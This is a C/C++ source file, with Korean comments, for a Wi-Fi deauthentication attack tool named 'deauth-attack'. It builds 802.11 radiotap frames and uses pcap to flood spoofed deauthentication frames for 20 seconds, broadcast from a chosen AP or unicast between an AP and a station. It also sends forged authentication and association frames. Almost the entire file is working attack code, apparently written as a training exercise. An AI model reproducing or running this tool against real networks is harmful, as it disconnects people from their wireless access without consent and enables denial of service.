#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <thread>
#include <chrono>
#include <iomanip>

struct ieee80211_radiotap_header {
	u_int8_t        it_version = 0;     /* set to 0 */
	u_int8_t        it_pad = 0;
	u_int16_t       it_len = 8;         /* entire length */
    u_int32_t       it_present = 0;
} __attribute__((__packed__));

struct ieee80211_header {
	uint16_t frame_control;
	uint16_t duration_id = 0;
	uint8_t des[6];
	uint8_t sourceaddr4[6];
	uint8_t bssid[6];
	uint16_t sequence_control = 0;
};

struct Deauth_fixed {
    uint16_t ReasonCode;
};

struct Auth_fixed {
	uint16_t algo = 0;
	uint16_t seq = 1;
	uint16_t status = 0;
};

struct Asso_fixed {
	uint16_t cap = 0x1531;
	uint16_t interval = 0x14;
};
struct Asso_data{
	uint8_t id = 0;
	uint8_t length;
};

struct Deauth {
    struct ieee80211_radiotap_header rheader;
    struct ieee80211_header deauth;
    struct Deauth_fixed fixed;
};

struct Auth {
	struct ieee80211_radiotap_header rheader;
    struct ieee80211_header deauth;
	struct Auth_fixed fixed;
};

struct Asso {
	struct ieee80211_radiotap_header rheader;
    struct ieee80211_header deauth;
	struct Asso_fixed fixed;
	struct Asso_data data;
};

void usage() {
	printf("deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
};

void ApBroadcast(pcap_t* handle, char* apMac){
    //Ap -> BroadCast 0xc000
    uint8_t send[6];
    uint8_t des[6];

    //char* apMac에 저장되어 있는 Mac주소를 스트림으로 변환
    std::istringstream apMacStream(apMac);
    //각각의 16진수 값을 임시로 담는다.
    int value;
    // :
    char colon;

    for (int i = 0; i < 6; ++i) {
        //스트림을 16진수로 하여 값을 임시로 value에 넣고 그 뒤 :은 colon에 넣는다.
        apMacStream >> std::hex >> value >> colon;
        //send 배열에 value값을 uint8_t로 형변환 하여 넣는다.
        send[i] = static_cast<uint8_t>(value);
    }

    struct Deauth packet;

    packet.deauth.frame_control = 0x00c0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = 0xff;
    }

    for(int i = 0;i<6;i++){
        packet.deauth.sourceaddr4[i] = send[i]; 
        packet.deauth.bssid[i] = send[i];
    }

    packet.fixed.ReasonCode = 0x0007;
    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }
        fprintf(stderr,"send\n");
        end = std::chrono::steady_clock::now();
    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

void APUnicast(pcap_t* handle, char* apMac, char* stationMac){
    //Ap -> Station
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    struct Deauth packet;
    packet.deauth.frame_control = 0x00c0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = des[i];
        packet.deauth.bssid[i] = send[i];
        packet.deauth.sourceaddr4[i] = send[i];
    }

    packet.fixed.ReasonCode = 0x0007;

    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }
        fprintf(stderr,"send\n");
        end = std::chrono::steady_clock::now();
    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

void StationUnicast(pcap_t* handle, char* apMac, char* stationMac){
    //Station -> AP
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct Deauth packet;

    packet.deauth.frame_control = 0x00c0;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = des[i];
        packet.deauth.sourceaddr4[i] = send[i];
        packet.deauth.bssid[i] = des[i];
    }

    packet.fixed.ReasonCode = 0x0007;

    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if(pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }
        fprintf(stderr,"send\n");
        end = std::chrono::steady_clock::now();
    } while(std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}

void authentication(pcap_t* handle, char* apMac, char* stationMac,char* ssid){
    //Station -> AP
    uint8_t send[6];
    uint8_t des[6];
    std::istringstream apMacStream(apMac);
    std::istringstream stationMacStream(stationMac);
    int value;
    char colon;

    for (int i = 0; i < 6; ++i) {
        apMacStream >> std::hex >> value >> colon;
        des[i] = static_cast<uint8_t>(value);
    }

    value = 0;
    colon = 0;

    for (int i = 0; i < 6; ++i) {
        stationMacStream >> std::hex >> value >> colon;
        send[i] = static_cast<uint8_t>(value);
    }

    struct Auth packet;
    struct Asso assopacket;
    
    packet.deauth.frame_control = 0xb0;
    assopacket.deauth.frame_control = 0x00;
    
    for(int i = 0;i<6;i++){
        packet.deauth.des[i] = des[i];
        packet.deauth.sourceaddr4[i] = send[i];
        packet.deauth.bssid[i] = des[i];

        assopacket.deauth.des[i] = des[i];
        assopacket.deauth.sourceaddr4[i] = send[i]; 
        assopacket.deauth.bssid[i] = des[i];
    }
    
    //ssid의 길이를 저장한다.
    size_t ssidLength = strlen(ssid);
    //저장한 길이를 구조체에 저장한다.
    assopacket.data.length = ssidLength;
    //uint_8로 선언된 벡터를 구조체와 ssid길이 만큼 할당한다.
    std::vector<uint8_t> assoPacketData(sizeof(assopacket) + ssidLength);
    
    memcpy(assoPacketData.data(), &assopacket, sizeof(assopacket));
    memcpy(assoPacketData.data() + sizeof(assopacket), ssid, ssidLength);

    auto start = std::chrono::steady_clock::now();
    auto end = start;
    do {
        if (pcap_sendpacket(handle, (const u_char *)&packet, sizeof(packet)) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }

        if (pcap_sendpacket(handle, assoPacketData.data(), assoPacketData.size()) != 0) {
            fprintf(stderr, "\n패킷 전송 실패: %s\n", pcap_geterr(handle));
        }

        fprintf(stderr, "send\n");
        end = std::chrono::steady_clock::now();
    } while (std::chrono::duration_cast<std::chrono::seconds>(end - start).count() < 20);
}